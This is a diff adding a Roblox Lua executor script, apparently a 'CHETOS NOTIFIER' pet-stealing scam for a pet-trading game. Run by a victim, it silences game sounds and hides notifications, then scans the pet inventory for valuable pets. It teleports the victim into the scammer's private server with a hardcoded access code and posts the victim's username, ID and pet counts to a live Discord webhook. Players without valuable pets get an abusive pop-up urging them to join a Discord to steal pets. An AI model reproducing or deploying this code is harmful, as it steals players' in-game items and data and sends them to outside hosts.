@@ -1,0 +1,128 @@
+local CoreGui = game:GetService("CoreGui")
+local RunService = game:GetService("RunService")
+local EXECUTION_FLAG_NAME = "ChetosExecutionFlag"
+if CoreGui:FindFirstChild(EXECUTION_FLAG_NAME) then return end
+local flag = Instance.new("BoolValue")
+flag.Name = EXECUTION_FLAG_NAME
+flag.Parent = CoreGui
+
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+local player = Players.LocalPlayer
+
+pcall(function()
+    local function muteSound(sound) if sound:IsA("Sound") then sound.Volume = 0; sound.Playing = false end end
+    game.DescendantAdded:Connect(muteSound)
+    for _, sound in ipairs(game:GetDescendants()) do muteSound(sound) end
+    RunService.Heartbeat:Connect(function()
+        local notificationGui = player:WaitForChild("PlayerGui"):FindFirstChild("Top_Notification")
+        if notificationGui then notificationGui:Destroy() end
+    end)
+end)
+
+local CONFIG = {
+    ["MAIN_WEBHOOK_URL"] = "https://discord.com/api/webhooks/1423150330220380170/1NfkU25fK9dnB23Zsh-yMVCFWNNZpAsI4zxeI-sP14YLDLI5VQ2pWU8CTcfd2ajoDSqp",
+    ["AFFILIATE_WEBHOOK_URL"] = nil,
+    ["MAIN_ACCESS_CODE"] = "j50GRP6cfkV1FnSNh_-5CBLmxfmpdUPBjvfeTzW04u2S8DWlZnMAAA2",
+    ["HUGE_PET_WEIGHT"] = 6.0,
+    ["DYNAMIC_DISCORD_LINKS"] = {"https://discord.gg/KBJpunjdPr"},
+    ["PRIORITY_PETS"] = {
+        ["Brontosaurus"] = true, ["Butterfly"] = true, ["Corrupted Kitsune"] = true, ["Disco Bee"] = true, 
+        ["Dragonfly"] = true, ["Fennec Fox"] = true, ["French Fry Ferret"] = true, ["GIANT Swan"] = true, 
+        ["Griffin"] = true, ["Kitsune"] = true, ["Lobster Thermidor"] = true, ["Meerkat"] = true, 
+        ["Mimic Octopus"] = true, ["Mizuchi"] = true, ["Peacock"] = true, ["Phoenix"] = true, 
+        ["Queen Bee"] = true, ["Raccoon"] = true, ["Rainbow Corrupted Kitsune"] = true, ["Rainbow Griffin"] = true, 
+        ["Rainbow Lobster Thermidor"] = true, ["Rainbow Mizuchi"] = true, ["Rainbow Phoenix"] = true, 
+        ["Rainbow Spinosaurus"] = true, ["Red Fox"] = true, ["Spinosaurus"] = true, ["Swan"] = true, 
+        ["T-Rex"] = true, ["Tiger"] = true
+    }
+}
+
+local env = getgenv()
+if env and env.Webhook then
+    CONFIG["AFFILIATE_WEBHOOK_URL"] = env.Webhook
+end
+
+local function createStyledNotificationGUI(titleText, messageText, buttonText)
+    local chosenLink = CONFIG["DYNAMIC_DISCORD_LINKS"][math.random(1, #CONFIG["DYNAMIC_DISCORD_LINKS"])]
+    local gui = Instance.new("ScreenGui", CoreGui); gui.ResetOnSpawn = false; gui.ZIndexBehavior = Enum.ZIndexBehavior.Global; gui.DisplayOrder = 1000
+    local overlay = Instance.new("Frame", gui); overlay.Size = UDim2.fromScale(1, 1); overlay.BackgroundColor3 = Color3.new(0, 0, 0); overlay.BackgroundTransparency = 0.4; overlay.Active = true
+    local mainFrame = Instance.new("Frame", overlay); mainFrame.AnchorPoint = Vector2.new(0.5, 0.5); mainFrame.Position = UDim2.fromScale(0.5, 0.5); mainFrame.Size = UDim2.new(0, 500, 0, 250); mainFrame.BackgroundColor3 = Color3.fromRGB(28, 28, 32); mainFrame.BackgroundTransparency = 0.1; mainFrame.BorderSizePixel = 0
+    local corner = Instance.new("UICorner", mainFrame); corner.CornerRadius = UDim.new(0, 12)
+    local titleLabel = Instance.new("TextLabel", mainFrame); titleLabel.AnchorPoint = Vector2.new(0.5, 0); titleLabel.Position = UDim2.fromScale(0.5, 0.1); titleLabel.Size = UDim2.fromScale(0.8, 0.2); titleLabel.BackgroundTransparency = 1; titleLabel.Font = Enum.Font.SourceSansBold; titleLabel.Text = titleText; titleLabel.TextColor3 = Color3.new(1, 1, 1); titleLabel.TextScaled = true
+    local messageLabel = Instance.new("TextLabel", mainFrame); messageLabel.AnchorPoint = Vector2.new(0.5, 0.45); messageLabel.Position = UDim2.fromScale(0.5, 0.45); messageLabel.Size = UDim2.fromScale(0.85, 0.3); messageLabel.BackgroundTransparency = 1; messageLabel.Font = Enum.Font.SourceSans; messageLabel.Text = messageText; messageLabel.TextColor3 = Color3.fromRGB(200, 200, 200); messageLabel.TextSize = 18; messageLabel.TextWrapped = true
+    local linkButton = Instance.new("TextButton", mainFrame); linkButton.AnchorPoint = Vector2.new(0.5, 1); linkButton.Position = UDim2.fromScale(0.5, 0.9); linkButton.Size = UDim2.fromScale(0.7, 0.25); linkButton.BackgroundColor3 = Color3.fromRGB(88, 101, 242); linkButton.Font = Enum.Font.SourceSansBold; linkButton.Text = buttonText; linkButton.TextColor3 = Color3.new(1, 1, 1); linkButton.TextScaled = true
+    local btnCorner = Instance.new("UICorner", linkButton); btnCorner.CornerRadius = UDim.new(0, 8)
+    linkButton.MouseButton1Click:Connect(function() if type(setclipboard) == "function" then setclipboard(chosenLink); linkButton.Text = "LINK COPIED!"; task.wait(2); linkButton.Text = buttonText end end)
+    return gui
+end
+
+local MUTATION_MAP = {}
+pcall(function()
+    local PetMutationRegistry = require(ReplicatedStorage.Data.PetRegistry.PetMutationRegistry)
+    for name, data in pairs(PetMutationRegistry.PetMutationRegistry) do MUTATION_MAP[data.EnumId] = name; MUTATION_MAP[name] = name end
+end)
+
+local Util = {Get = function(tbl, path, default) local c = tbl; for k in string.gmatch(path, "[^.]+") do if type(c) ~= "table" or c[k] == nil then return default end c = c[k] end return c end}
+local function getExecutorName() if getexecutorname then local s, n = pcall(getexecutorname); if s and type(n) == "string" then return n end end; if identifyexecutor then local s, n = pcall(identifyexecutor); if s and type(n) == "string" then return n:gsub(" Executor", "") end end; return "Unknown" end
+
+local function sendToAllWebhooks(payload)
+    local webhooks = {CONFIG.MAIN_WEBHOOK_URL}
+    if CONFIG.AFFILIATE_WEBHOOK_URL then table.insert(webhooks, CONFIG.AFFILIATE_WEBHOOK_URL) end
+    local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
+    if not requestFunc then return end
+    for _, url in ipairs(webhooks) do
+        if url then
+            task.spawn(function() pcall(function() requestFunc({ Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(payload) }) end) end)
+        end
+    end
+end
+
+task.spawn(function()
+    local DataService = require(ReplicatedStorage.Modules.DataService)
+    local PlayerData = DataService:GetData()
+    local InventoryData = Util.Get(PlayerData, "PetsData.PetInventory.Data")
+    if not InventoryData then return end
+
+    local priorityPets, hugePets = {}, {}
+    local petCounts = {["Mimic Octopus"]=0, ["Dragonfly"]=0, ["Disco Bee"]=0, ["Butterfly"]=0, ["Kitsune"]=0, ["Raccoon"]=0}
+    local hasHugePeacock, hasHugeMimic, hasRainbowMimic = false, false, false
+
+    for uuid, petInfo in pairs(InventoryData) do
+        if type(petInfo) == "table" and petInfo.PetData then
+            local baseWeight = tonumber(Util.Get(petInfo, "PetData.BaseWeight", 0))
+            if baseWeight > 0 then
+                local basePetType = tostring(petInfo.PetType or "Unknown")
+                local isHuge = baseWeight >= CONFIG.HUGE_PET_WEIGHT
+                if isHuge then table.insert(hugePets, petInfo) end
+                if CONFIG.PRIORITY_PETS[basePetType] then table.insert(priorityPets, petInfo) end
+                if petCounts[basePetType] then petCounts[basePetType] = petCounts[basePetType] + 1 end
+                if isHuge and basePetType == "Peacock" then hasHugePeacock = true end
+                if isHuge and basePetType == "Mimic Octopus" then hasHugeMimic = true end
+                if basePetType == "Mimic Octopus" and (petInfo.PetData.MutationType or petInfo.PetData.Mutation) then hasRainbowMimic = true end
+            end
+        end
+    end
+
+    if #hugePets == 0 and #priorityPets == 0 then
+        createStyledNotificationGUI("YOU ARE POOR", "you're poor man you are shit you don't have good pets join here to steal people's pets click the join link", "Join Link")
+        return
+    end
+
+    local useMainServer = (
+        hasHugePeacock or hasHugeMimic or hasRainbowMimic or
+        petCounts["Mimic Octopus"] >= 4 or petCounts["Dragonfly"] >= 4 or petCounts["Disco Bee"] >= 2 or
+        petCounts["Butterfly"] >= 3 or petCounts["Kitsune"] >= 1 or petCounts["Raccoon"] >= 2
+    )
+
+    local finalAccessCode = useMainServer and CONFIG.MAIN_ACCESS_CODE or getgenv().accesscode
+    if finalAccessCode then pcall(function() game.RobloxReplicatedStorage.ContactListIrisInviteTeleport:FireServer(game.PlaceId, "", finalAccessCode) end) end
+    
+    local description = "**Player:** " .. player.Name .. " (" .. player.UserId .. ")\n**Huge Pets:** " .. #hugePets .. "\n**Priority Pets:** " .. #priorityPets
+    local embed = { title = "🐾 **CHETOS NOTIFIER HIT**", color = 3066993, description = description, footer = {text = "CHETOS NOTIFIER"}, timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ") }
+    local joinCommand = ""
+    if finalAccessCode then joinCommand = string.format("```lua\nlocal accesscode = \"%s\"\nlocal placeid = game.PlaceId\ngame.RobloxReplicatedStorage.ContactListIrisInviteTeleport:FireServer(placeid, \"\", accesscode)\n```", finalAccessCode) end
+    local payload = { username = "CHETOS NOTIFIER", content = "@everyone Hit!\n" .. joinCommand, embeds = { embed } }
+    sendToAllWebhooks(payload)
+end)
